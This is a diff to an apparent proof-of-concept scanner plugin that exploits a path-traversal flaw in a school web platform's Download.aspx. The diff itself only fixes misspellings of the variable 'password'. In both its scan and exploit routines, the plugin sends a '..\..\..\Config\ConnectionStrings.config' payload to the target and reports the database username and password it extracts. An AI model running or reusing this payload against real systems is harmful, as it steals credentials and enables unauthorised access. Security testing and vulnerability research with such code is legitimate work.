@@ -55,7 +55,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             username = ""
-            passwor = ""
+            password = ""
             payload = "/User/UserZone/School/Download.aspx?f=..\..\..\Config\ConnectionStrings.config"
             verify_url = '{target}'.format(target=self.target)+payload
             response = urllib.request.urlopen(verify_url)
@@ -78,7 +78,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                 target=self.target, vuln=self.vuln))
             username = ""
-            passwor = ""
+            password = ""
             payload = "/User/UserZone/School/Download.aspx?f=..\..\..\Config\ConnectionStrings.config"
             verify_url = '{target}'.format(target=self.target)+payload
             response = urllib.request.urlopen(verify_url)
@@ -89,7 +89,7 @@ class Poc(ABPoc):
 
             if username and password:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
-                    target=self.target, name=self.vuln.name, username=username, password=passworda))
+                    target=self.target, name=self.vuln.name, username=username, password=password))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
